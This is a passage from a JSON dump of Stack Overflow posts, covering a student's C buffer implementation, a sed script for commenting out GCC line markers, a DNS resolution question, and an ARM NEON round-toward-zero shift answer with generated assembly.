printf(\"The Buffer is empty.\\n\");\n        return numOfChars;\n    }\n\n    pBD-&gt;getc_offset = 0;\n    while (1) {\n        c = b_getc(pBD);\n        if (b_eob(pBD))\n            break;\n        printf(\"%c\", c);\n        ++numOfChars;\n    }\n\n    numOfChars = pBD-&gt;getc_offset;\n    pBD-&gt;getc_offset = 0;\n    printf(\"\\n\");\n    return numOfChars;\n}\n\n/* b_compact: shrinks buffer to new capacity, before returning to a pointer add symbol\nto the end of buffer, must set r_flag appropriatley */\nBuffer * b_compact(Buffer * const pBD, char symbol) {\n    char *tempBuffer;\n    short tempCap;\n    if (!pBD)\n        return NULL;\n\n    tempCap = (pBD-&gt;addc_offset + 1) * sizeof(char);\n    if (tempCap == SHRT_MAX)\n        return pBD;\n\n    tempBuffer = (char *)realloc(pBD-&gt;cb_head, (unsigned short)tempCap);\n    if (tempCap == 0)\n        return NULL;\n\n    if (tempBuffer != pBD-&gt;cb_head)\n        pBD-&gt;r_flag = SET_R_FLAG;\n\n    pBD-&gt;cb_head = tempBuffer;\n    pBD-&gt;capacity = tempCap;\n    return pBD;\n\n}\n\n/* b_rflag: returns r_flag, returns -1 on error */\nchar b_rflag(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    return pBD-&gt;r_flag;\n}\n\n/* b_retract: decrements getc_offset by 1, returns -1 on error, otherwise returns getc_offset */\nshort b_retract(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    pBD-&gt;getc_offset--;\n    return pBD-&gt;getc_offset;\n}\n\n/* b_reset: sets getc_offset to current markc_offset, returns -1 on error and getc_offset otherwise */\nshort b_reset(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    pBD-&gt;getc_offset = pBD-&gt;markc_offset;\n    return pBD-&gt;getc_offset;\n}\n\n/* b_getcoffset: returns getc_offset, or returns -1 on error */\nshort b_getcoffset(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    return pBD-&gt;getc_offset;\n}\n\n/* b_rewind: set getc_offset and markc_offset to 0, return -1 on error and 0 otherwise */\nint b_rewind(Buffer * const pBD) {\n    if (!pBD)\n        return RT_FAIL1;\n\n    pBD-&gt;addc_offset = 0;\n    pBD-&gt;markc_offset = 0;\n    return 0;\n}\n\n/* b_location: returns a pointer to location indicated by loc_offset, returns null on error */\n\nchar * b_location(Buffer * const pBD, short loc_offset) {\n    if (!pBD)\n        return NULL;\n\n    return *loc_offset;\n}\n</code></pre>\n\n<p>And finally my <code>buffer.h</code>:</p>\n\n<pre><code>/*File Name: buffer.h\n* Version: 1.18.1\n* Author: S^R\n* Date: 16 January 2018\n* Preprocessor directives, type declarations and prototypes necessary for buffer implementation\n* as required for CST8152-Assignment #1.\n* The file is not completed.\n* You must add your function declarations (prototypes).\n* You must also add your constant definitions and macros,if any.\n*/\n\n#ifndef BUFFER_H_\n#define BUFFER_H_\n\n/*#pragma warning(1:4001) *//*to enforce C89 type comments  - to make //comments an warning */\n\n/* standard header files */\n#include &lt;stdio.h&gt;  /* standard input/output */\n#include &lt;malloc.h&gt; /* for dynamic memory allocation*/\n#include &lt;limits.h&gt; /* implementation-defined data type ranges and limits */\n\n/* constant definitions */\n/* You may add your own constant definitions here */\n#define RT_FAIL1 -1         /* fail return value */\n#define RT_FAIL2 -2         /* fail return value */\n#define LOAD_FAIL -2        /* load fail error */\n#define SET_R_FLAG 1        /* realloc flag set value */\n#define ADD_MODE 1;         /* named constant for additive mode */\n#define MULTI_MODE -1;      /* named constant for multiplicative mode */\n#define NEW_ONE 1;          /* generic named constant value of 1 */\n#define NEW_FULL 256;       /* generic named constant value of 256 */\n\n\n/* user data type declarations */\ntypedef struct BufferDescriptor {\n    char *cb_head;   /* pointer to the beginning of character array (character buffer) */\n    short capacity;    /* current dynamic memory size (in bytes) allocated to character buffer */\n    short addc_offset;  /* the offset (in chars) to the add-character location */\n    short getc_offset;  /* the offset (in chars) to the get-character location */\n    short markc_offset; /* the offset (in chars) to the mark location */\n    char  inc_factor; /* character array increment factor */\n    char  r_flag;     /* reallocation flag */\n    char  mode;       /* operational mode indicator*/\n    int   eob;       /* end-of-buffer flag */\n} Buffer, *pBuffer;\n\n\n/* function declarations */\n/*\nPlace your function declarations here.\nDo not include the function header comments here.\nPlace them in the buffer.c file\n*/\nBuffer * b_allocate(short init_capacity, char inc_factor, char o_mode);\npBuffer b_addc(pBuffer const pBD, char symbol);\nint b_clear(Buffer * const pBD);\nvoid b_free(Buffer * const pBD);\nint b_isfull(Buffer * const pBD);\nshort b_limit(Buffer * const pBD);\nshort b_capacity(Buffer * const pBD);\nshort b_mark(pBuffer const pBD, short mark);\nint b_mode(Buffer * const pBD);\nsize_t b_incfactor(Buffer * const pBD);\nint b_load(FILE * const fi, Buffer * const pBD);\nint b_isempty(Buffer * const pBD);\nint b_eob(Buffer * const pBD);\nchar b_getc(Buffer * const pBD);\nint b_print(Buffer * const pBD);\nBuffer * b_compact(Buffer * const pBD, char symbol);\nchar b_rflag(Buffer * const pBD);\nshort b_retract(Buffer * const pBD);\nshort b_reset(Buffer * const pBD);\nshort b_getcoffset(Buffer * const pBD);\nint b_rewind(Buffer * const pBD);\nchar * b_location(Buffer * const pBD, short loc_offset);\n\n#endif\n</code></pre>\n\n<p>So again, I need to find the location of loc_offset in my b_location function and return it as a pointer. Thanks in advance!</p>\n"}, {"tags": ["c", "gcc"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1518016370, "post_id": 48667110, "comment_id": 84331915, "body": "&quot;Is there&quot; = &quot;Write it for me&quot; ?"}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 4, "creation_date": 1518016434, "post_id": 48667110, "comment_id": 84331952, "body": "As @EugeneSh. said, because you just wrote the regular expression in common language. Just needs translation, and reading any manual or tutorial will allow you to write this."}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518017179, "post_id": 48667110, "comment_id": 84332492, "body": "Have you tried anything at all? Also Google &quot;regex tester&quot;. You can try things online to test your regex ideas."}, {"owner": {"reputation": 23, "user_id": 9328215, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a60ade800b14e087cc29bb7f965d592f?s=128&d=identicon&r=PG&f=1", "display_name": "Dude", "link": "https://stackoverflow.com/users/9328215/dude"}, "reply_to_user": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518035592, "post_id": 48667110, "comment_id": 84343780, "body": "thanks  @lurker your comment is the most useful and helpful above all other"}], "answers": [{"tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 1, "last_activity_date": 1518020206, "creation_date": 1518020206, "answer_id": 48668465, "question_id": 48667110, "link": "https://stackoverflow.com/questions/48667110/regular-expression-for-gcc-pre-processor-line-markers/48668465#48668465", "title": "Regular expression for GCC Pre Processor Line markers", "body": "<p>I dunno where you'd want Bash to match such lines, and Python undoubtedly could do it with its regexes.  I have a <code>sed</code> script which I use to convert <code>#line</code> directives into comments (which can sometimes make debugging preprocessed code easier).  It looks like this:</p>\n\n<pre><code>#!/bin/sh\n#\n# @(#)$Id: linecomments.sh,v 1.3 2018/01/05 05:12:10 jleffler Exp $\n#\n# Convert #line directives into comments\n# Deals with four forms of the #line directive:\n#           # line 99 \"file\"\n#           # line 99\n#           # 99 \"file\"\n#           # 99\n\nexec sed \\\n    -e 's%^[[:space:]]*#[[:space:]]*line[[:space:]][0-9][0-9]*[[:space:]].*%/*&amp;*/%' \\\n    -e 's%^[[:space:]]*#[[:space:]]*[0-9][0-9]*[[:space:]].*%/*&amp;*/%' \\\n    -e 's%^[[:space:]]*#[[:space:]]*line[[:space:]][0-9][0-9]*$%/*&amp;*/%' \\\n    -e 's%^[[:space:]]*#[[:space:]]*[0-9][0-9]*$%/*&amp;*/%' \\\n    \"$@\"\n</code></pre>\n\n<p>I use <code>%</code> to delimit the regular expressions since I need <code>/*</code> and <code>*/</code> in the replacement text. The regexes match 'trailing junk' such as the extra numbers emitted by GCC.</p>\n\n<p>The edit in 2018 replaced fragments that looked like <code>[\u00a0\u00a0]</code> with <code>[[:space:]]</code> \u2014 the old code (dated 2001) used a blank and a tab in each case.  This is clearer; you can copy'n'paste without having to worry about where there are tabs.</p>\n"}], "owner": {"reputation": 23, "user_id": 9328215, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a60ade800b14e087cc29bb7f965d592f?s=128&d=identicon&r=PG&f=1", "display_name": "Dude", "link": "https://stackoverflow.com/users/9328215/dude"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 171, "favorite_count": 0, "accepted_answer_id": 48668465, "answer_count": 1, "score": -2, "last_activity_date": 1518020206, "creation_date": 1518016283, "question_id": 48667110, "link": "https://stackoverflow.com/questions/48667110/regular-expression-for-gcc-pre-processor-line-markers", "title": "Regular expression for GCC Pre Processor Line markers", "body": "<p>Is there any Bash or Python regular expression for below C pre processor line marker ?</p>\n\n<p>C Pre Processor output line markers as follows:</p>\n\n<pre><code># 74 \"a/b/some_file.c\" 3 4\n</code></pre>\n\n<p>First comes the symbol - #\nspace\nthen line number - 74\nspace\nthen - \"file path\"\nspace\nthen Zero or more integers separated by space - 3 4</p>\n\n<p>More info on:</p>\n\n<p><a href=\"https://gcc.gnu.org/onlinedocs/gcc-6.4.0/cpp/Preprocessor-Output.html\" rel=\"nofollow noreferrer\">https://gcc.gnu.org/onlinedocs/gcc-6.4.0/cpp/Preprocessor-Output.html</a></p>\n"}, {"tags": ["c", "dns"], "comments": [{"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 1, "creation_date": 1518016362, "post_id": 48667108, "comment_id": 84331904, "body": "That information is not part of getnameinfo() API."}, {"owner": {"reputation": 43, "user_id": 8525891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L4EZY.jpg?s=128&g=1", "display_name": "Chouchenn", "link": "https://stackoverflow.com/users/8525891/chouchenn"}, "reply_to_user": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1518077035, "post_id": 48667108, "comment_id": 84357828, "body": "I agree. So, is there any other way to get such information ?"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 1, "creation_date": 1518079958, "post_id": 48667108, "comment_id": 84359470, "body": "Depends on what context you need it. If you need your own program to figure out that, then probably not. If it&#39;s a debugging approach, you can run your program under the <code>strace</code> tool, and inspect what it&#39;s doing (you should be able to see if it creates a socket and sends UDP packets to a server on port 53 (DNS), etc.)"}], "owner": {"reputation": 43, "user_id": 8525891, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/L4EZY.jpg?s=128&g=1", "display_name": "Chouchenn", "link": "https://stackoverflow.com/users/8525891/chouchenn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 48, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518016269, "creation_date": 1518016269, "question_id": 48667108, "link": "https://stackoverflow.com/questions/48667108/how-to-know-which-dns-served-a-request", "title": "How to know which DNS served a request?", "body": "<p>My environment uses 3 DNS servers. \nWith res_init (from resolv.h) I can retrieve the DNS server list of my Linux system.</p>\n\n<p>With getnameinfo() I can resolve an IP address to a name.\nBut, how can I know what is the DNS server that has served the request or even if it is the local hosts file that was used ?</p>\n\n<p>Any idea ? </p>\n\n<p>Thanks in advance.</p>\n\n<p>Regards.</p>\n"}, {"tags": ["c", "arm", "neon"], "comments": [{"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 3, "creation_date": 1518015147, "post_id": 48666696, "comment_id": 84331034, "body": "there is usually no such instruction in microprocessors."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 1, "creation_date": 1518015811, "post_id": 48666696, "comment_id": 84331504, "body": "You&#39;re looking for round-up for negative numbers, and round-down for positive?  You won&#39;t get that in a single instruction, I think.  But you could add <code>number &gt;&gt; (bits - 1) &amp; number &gt;&gt; (shift - 1) &amp; 1</code> to the number before shifting, I think (where <code>bits</code> is <code>sizeof number * CHAR_BIT</code>)."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518016222, "post_id": 48666696, "comment_id": 84331791, "body": "The operation you describe is not shifting. That&#39;s why there is no such a low-level instruction."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1518016823, "post_id": 48666696, "comment_id": 84332234, "body": "Are you using the full range of your integer input value ?"}, {"owner": {"reputation": 229, "user_id": 3616359, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/242ba12e1ca847f671c4b4ba3e5e7309?s=128&d=identicon&r=PG&f=1", "display_name": "user3616359", "link": "https://stackoverflow.com/users/3616359/user3616359"}, "edited": false, "score": 0, "creation_date": 1518016928, "post_id": 48666696, "comment_id": 84332312, "body": "I am trying to use int16x4_t arm type."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1518019675, "post_id": 48666696, "comment_id": 84334326, "body": "OK - but are you using the full range, from -32768 to +32767 ?"}, {"owner": {"reputation": 229, "user_id": 3616359, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/242ba12e1ca847f671c4b4ba3e5e7309?s=128&d=identicon&r=PG&f=1", "display_name": "user3616359", "link": "https://stackoverflow.com/users/3616359/user3616359"}, "edited": false, "score": 0, "creation_date": 1518020163, "post_id": 48666696, "comment_id": 84334661, "body": "Yes, I use full range."}, {"owner": {"reputation": 195333, "user_id": 253056, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/1977cbe0ac5ffec4f6ee5ee24363988a?s=128&d=identicon&r=PG", "display_name": "Paul R", "link": "https://stackoverflow.com/users/253056/paul-r"}, "edited": false, "score": 0, "creation_date": 1518022126, "post_id": 48666696, "comment_id": 84336022, "body": "OK - so you can&#39;t use the logic above, where you shift the abs value and handle the sign separately then."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1518028926, "post_id": 48666696, "comment_id": 84340049, "body": "I&#39;ve now written an answer and edited it to show how GCC generates Neon instructions for (a corrected version of) the algorithm in my comment.  It took a while, due to the care required to avoid out-of-range bitshifts and get everything right."}], "answers": [{"tags": [], "owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "is_accepted": true, "score": 1, "last_activity_date": 1518077651, "last_edit_date": 1518077651, "creation_date": 1518021837, "answer_id": 48669012, "question_id": 48666696, "link": "https://stackoverflow.com/questions/48666696/are-there-are-arm-neon-instructions-for-signed-right-shift-that-round-toward-zer/48669012#48669012", "title": "Are there are ARM NEON instructions for signed right-shift that round toward zero?", "body": "<p>I don't think there's a single-instruction shift with round-toward-zero behaviour.</p>\n\n<p>However, you can do it fairly simply with a couple of shift and mask instructions.  What we need to do is to add one to the result if we started with a negative number and there is a 'carry' out (i.e. any bit to the right of the result would have been 1).</p>\n\n<p>I can demonstrate this with the following pure C code:</p>\n\n<pre><code>#include &lt;stddef.h&gt;\n#include &lt;limits.h&gt;\n\nint16_t rightshift(int number, unsigned int shift)\n{\n    static const size_t bits = sizeof number * CHAR_BIT;\n\n    number += ((1&lt;&lt;shift) - 1) &amp; (number &gt;&gt; bits-1);\n    return number &gt;&gt; shift;\n}\n\n#include &lt;stdio.h&gt;\nint main() {\n    for (int i = -16; i &lt;= 16;  ++i) {\n        printf(\" %3d: \", i);\n        for (int j = 0;  j &lt; 4;  ++j)\n            printf(\"%4d\", rightshift(i, j));\n        puts(\"\");\n    }\n}\n</code></pre>\n\n<p>This compiles to some nice branch-fee assembly, which looks amenable to inlining (especially when <code>shift</code> is a compile-time constant):</p>\n\n<pre class=\"lang-asm prettyprint-override\"><code>rightshift:\n    @ args = 0, pretend = 0, frame = 0\n    @ frame_needed = 0, uses_anonymous_args = 0\n    @ link register save eliminated.\n    movs    r3, #1\n    lsls    r3, r3, r1\n    subs    r3, r3, #1\n    and r3, r3, r0, asr #31\n    add r0, r0, r3\n    asrs    r0, r0, r1\n    bx  lr\n</code></pre>\n\n<hr>\n\n<p>To target Neon, I wrote another function, to exercise it with multiple data:</p>\n\n<pre><code>void do_shift(int16_t *restrict dest, const int16_t *restrict src,\n              size_t count, unsigned int shift)\n{\n    for (size_t j = 0;  j &lt; count;  ++j) {\n        dest[j] = rightshift(src[j], shift);\n    }\n}\n</code></pre>\n\n<p>And a test program for it:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main() {\n    static const int16_t src[] = {\n        -32768, -32767, -32766, -32765, -32764,\n        -16384, -16383, -16382, -16381, -16380,\n        -8193,  -8192,  -8191,  -8190,  -8189,\n        -16, -15, -14, -13, -12, -10, -9,\n        -8, -7, -6, -5, -4, -3, -2, -1, 0,\n        1, 2, 3, 4, 5, 6, 7, 8,\n        9, 10, 11, 12, 13, 14, 15, 16,\n        1023, 1024, 32767,\n    };\n    static const size_t count = sizeof src / sizeof *src;\n    int16_t dest[16][count];\n\n    for (unsigned int i = 0; i &lt; 16;  ++i) {\n        do_shift(dest[i], src, count, i);\n    }\n\n    for (size_t i = 0;  i &lt; count;  ++i) {\n        printf(\"%7d: \", src[i]);\n        for (int j = 0;  j &lt; 16;  ++j)\n            printf(\"%7d\", dest[j][i]);\n        puts(\"\");\n    }\n}\n</code></pre>\n\n<p>I compiled this with <code>gcc -O3 -march=armv7 -mfpu=neon</code>.  I confess I'm not familiar with the Neon instructions, but the results may be instructive:</p>\n\n<pre class=\"lang-asm prettyprint-override\"><code>do_shift:\n    @ args = 0, pretend = 0, frame = 0\n    @ frame_needed = 0, uses_anonymous_args = 0\n    cmp r2, #0\n    beq .L21\n    push    {r4, r5, r6, r7, r8, lr}\n    ubfx    r4, r1, #1, #2\n    negs    r4, r4\n    movs    r5, #1\n    and r4, r4, #7\n    lsls    r5, r5, r3\n    adds    r7, r4, #7\n    subs    r6, r2, #1\n    subs    r5, r5, #1\n    cmp r6, r7\n    sxth    r5, r5\n    bcc .L8\n    cmp r4, #0\n    beq .L9\n    ldrsh   r7, [r1]\n    cmp r4, #1\n    and r6, r5, r7, asr #31\n    add r6, r6, r7\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0]    @ movhi\n    beq .L9\n    ldrsh   r7, [r1, #2]\n    cmp r4, #2\n    and r6, r5, r7, asr #31\n    add r6, r6, r7\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, #2]    @ movhi\n    beq .L9\n    ldrsh   r7, [r1, #4]\n    cmp r4, #3\n    and r6, r5, r7, asr #31\n    add r6, r6, r7\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, #4]    @ movhi\n    beq .L9\n    ldrsh   r7, [r1, #6]\n    cmp r4, #4\n    and r6, r5, r7, asr #31\n    add r6, r6, r7\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, #6]    @ movhi\n    beq .L9\n    ldrsh   r7, [r1, #8]\n    cmp r4, #5\n    and r6, r5, r7, asr #31\n    add r6, r6, r7\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, #8]    @ movhi\n    beq .L9\n    ldrsh   r7, [r1, #10]\n    cmp r4, #7\n    ite eq\n    moveq   r8, r4\n    movne   r8, #6\n    and r6, r5, r7, asr #31\n    add r6, r6, r7\n    it  eq\n    ldrsheq r7, [r1, #12]\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, #10]   @ movhi\n    itttt   eq\n    andeq   r6, r5, r7, asr #31\n    addeq   r6, r6, r7\n    sxtheq  r6, r6\n    asreq   r6, r6, r3\n    it  eq\n    strheq  r6, [r0, #12]   @ movhi\n.L4:\n    vdup.32 q10, r3\n    sub lr, r2, r4\n    lsls    r4, r4, #1\n    movs    r7, #0\n    vneg.s32    q10, q10\n    adds    r6, r1, r4\n    lsr ip, lr, #3\n    add r4, r4, r0\n    vdup.16 q12, r5\n.L6:\n    adds    r7, r7, #1\n    adds    r6, r6, #16\n    vldr    d18, [r6, #-16]\n    vldr    d19, [r6, #-8]\n    cmp r7, ip\n    vshr.s16    q8, q9, #15\n    vand    q8, q8, q12\n    vadd.i16    q8, q8, q9\n    vmovl.s16 q9, d16\n    vmovl.s16 q8, d17\n    vshl.s32    q9, q9, q10\n    vshl.s32    q8, q8, q10\n    vmovn.i32   d22, q9\n    vmovn.i32   d23, q8\n    vst1.16 {q11}, [r4]\n    add r4, r4, #16\n    bcc .L6\n    bic r6, lr, #7\n    cmp lr, r6\n    add r4, r8, r6\n    beq .L1\n.L3:\n    ldrsh   ip, [r1, r4, lsl #1]\n    adds    r7, r4, #1\n    cmp r2, r7\n    and r6, r5, ip, asr #31\n    add r6, r6, ip\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, r4, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, r7, lsl #1]\n    add ip, r4, #2\n    cmp r2, ip\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, r7, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, ip, lsl #1]\n    adds    r7, r4, #3\n    cmp r2, r7\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, ip, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, r7, lsl #1]\n    add ip, r4, #4\n    cmp r2, ip\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, r7, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, ip, lsl #1]\n    adds    r7, r4, #5\n    cmp r2, r7\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, ip, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, r7, lsl #1]\n    add ip, r4, #6\n    cmp r2, ip\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, r7, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, ip, lsl #1]\n    adds    r7, r4, #7\n    cmp r2, r7\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, ip, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, r7, lsl #1]\n    add ip, r4, #8\n    cmp r2, ip\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, r7, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, ip, lsl #1]\n    add r7, r4, #9\n    cmp r2, r7\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, ip, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, r7, lsl #1]\n    add ip, r4, #10\n    cmp r2, ip\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, r7, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, ip, lsl #1]\n    add r7, r4, #11\n    cmp r2, r7\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, ip, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   lr, [r1, r7, lsl #1]\n    add ip, r4, #12\n    cmp r2, ip\n    and r6, r5, lr, asr #31\n    add r6, r6, lr\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, r7, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   r7, [r1, ip, lsl #1]\n    adds    r4, r4, #13\n    cmp r2, r4\n    and r6, r5, r7, asr #31\n    add r6, r6, r7\n    sxth    r6, r6\n    asr r6, r6, r3\n    strh    r6, [r0, ip, lsl #1]    @ movhi\n    bls .L1\n    ldrsh   r1, [r1, r4, lsl #1]\n    and r2, r5, r1, asr #31\n    add r2, r2, r1\n    sxth    r2, r2\n    asr r3, r2, r3\n    strh    r3, [r0, r4, lsl #1]    @ movhi\n.L1:\n    pop {r4, r5, r6, r7, r8, pc}\n.L9:\n    mov r8, r4\n    b   .L4\n.L21:\n    bx  lr\n.L8:\n    movs    r4, #0\n    b   .L3\n</code></pre>\n\n<p>There's a lot of loop unrolling which makes the code longer, but the pattern should be clear.</p>\n"}], "owner": {"reputation": 229, "user_id": 3616359, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/242ba12e1ca847f671c4b4ba3e5e7309?s=128&d=identicon&r=PG&f=1", "display_name": "user3616359", "link": "https://stackoverflow.com/users/3616359/user3616359"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 381, "favorite_count": 0, "accepted_answer_id": 48669012, "answer_count": 1, "score": 0, "last_activity_date": 1518077651, "creation_date": 1518015036, "last_edit_date": 1518029735, "question_id": 48666696, "link": "https://stackoverflow.com/questions/48666696/are-there-are-arm-neon-instructions-for-signed-right-shift-that-round-toward-zer", "title": "Are there are ARM NEON instructions for signed right-shift that round toward zero?", "body": "<p>I am trying to implement an algorithm using ARM intrinsics.</p>\n\n<p>On step of the algorithm requires a right shift of a signed integer, but it needs to round negative values upwards (i.e. less negative).  For example, if shifting right by one, then -8 should give -4, but -1 should give 0.</p>\n\n<p>In other words, I want something that rounds negative values towards zero instead of rounding down:</p>\n\n<pre><code>int rightshift(int number, unsigned int shift)\n{\n    return ((number &lt; 0) ? -1 : 1) * (abs(number) &gt;&gt; shift);\n}\n</code></pre>\n\n<p>I am not able to find a suitable function to do this in SIMD fashion. Is there a way to do this in one function call, or some trick that could be used?</p>\n"}, {"tags": ["c", "arrays", "haskell", "vector", "benchmarking"], "comments": [{"owner": {"reputation": 7970, "user_id": 4117097, "user_type": "registered", "profile_image": 